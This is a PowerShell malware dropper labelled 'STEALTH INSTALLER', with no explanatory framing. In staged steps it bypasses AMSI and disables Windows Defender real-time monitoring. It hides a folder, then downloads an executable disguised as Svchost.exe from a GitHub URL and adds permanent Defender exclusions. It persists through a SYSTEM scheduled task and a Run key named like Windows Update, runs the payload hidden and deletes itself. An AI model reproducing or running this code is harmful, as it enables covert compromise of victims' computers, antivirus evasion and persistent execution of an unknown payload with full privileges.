# ============================================
# STEALTH INSTALLER - No Edge Required
# ============================================

# ============================================
# STAGE 1: AMSI BYPASS
# ============================================
try {
    [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
} catch {}

# ============================================
# STAGE 2: DEFENDER OFF (25 Seconds)
# ============================================
Add-MpPreference -ExclusionPath "$env:ProgramData\Microsoft\Windows\Drivers" -ErrorAction SilentlyContinue
Add-MpPreference -ExclusionProcess "svchost.exe" -ErrorAction SilentlyContinue
Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue

# ============================================
# STAGE 3: HIDDEN FOLDER (Har PC mein hai)
# ============================================
# Option 1: Windows Driver Folder (Always exists)
$HiddenFolder = "$env:ProgramData\Microsoft\Windows\Drivers"
if (!(Test-Path $HiddenFolder)) {
    New-Item -ItemType Directory -Path $HiddenFolder -Force | Out-Null
}
Set-ItemProperty -Path $HiddenFolder -Name Attributes -Value "Hidden, System"

$RandomName = [System.Guid]::NewGuid().ToString().Substring(0, 12) + ".exe"
$ExePath = Join-Path $HiddenFolder $RandomName

# ============================================
# STAGE 4: DOWNLOAD EXE
# ============================================
$DownloadUrl = "https://raw.githubusercontent.com/tanish-king/updater/main/Svchost.exe"
$wc = New-Object System.Net.WebClient
$wc.Headers.Add("User-Agent", "Mozilla/5.0")
$wc.DownloadFile($DownloadUrl, $ExePath)
Set-ItemProperty -Path $ExePath -Name Attributes -Value "Hidden, System"

# ============================================
# STAGE 5: PERMANENT EXCLUSIONS
# ============================================
$regPath = "HKLM:\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths"
if (!(Test-Path $regPath)) { New-Item -Path $regPath -Force | Out-Null }
Set-ItemProperty -Path $regPath -Name $HiddenFolder -Value 0 -Type DWord -Force

$regProcPath = "HKLM:\SOFTWARE\Microsoft\Windows Defender\Exclusions\Processes"
if (!(Test-Path $regProcPath)) { New-Item -Path $regProcPath -Force | Out-Null }
Set-ItemProperty -Path $regProcPath -Name $RandomName -Value 0 -Type DWord -Force

# ============================================
# STAGE 6: AUTO-START (HIGHEST PRIVILEGE)
# ============================================
# Scheduled Task
$action = New-ScheduledTaskAction -Execute $ExePath
$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -RunLevel Highest -LogonType ServiceAccount
$trigger = New-ScheduledTaskTrigger -AtStartup
$settings = New-ScheduledTaskSettingsSet -Hidden -Compatibility Win8
$taskName = "WindowsUpdate_" + [System.Guid]::NewGuid().ToString().Substring(0, 8)
Register-ScheduledTask -TaskName $taskName -Action $action -Principal $principal -Trigger $trigger -Settings $settings -Force | Out-Null

# Registry Run
$regRun = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
$regName = "WindowsUpdate_" + [System.Guid]::NewGuid().ToString().Substring(0, 8)
Set-ItemProperty -Path $regRun -Name $regName -Value $ExePath -Force

# ============================================
# STAGE 7: START EXE
# ============================================
Start-Process -FilePath $ExePath -WindowStyle Hidden

# ============================================
# STAGE 8: WAIT 25 SECONDS
# ============================================
Start-Sleep -Seconds 25

# ============================================
# STAGE 9: DEFENDER BACK ON
# ============================================
try {
    Set-MpPreference -DisableRealtimeMonitoring $false -ErrorAction SilentlyContinue
} catch {}

# ============================================
# STAGE 10: DELETE SCRIPT
# ============================================
try {
    Remove-Item $MyInvocation.MyCommand.Path -Force -ErrorAction SilentlyContinue
} catch {}
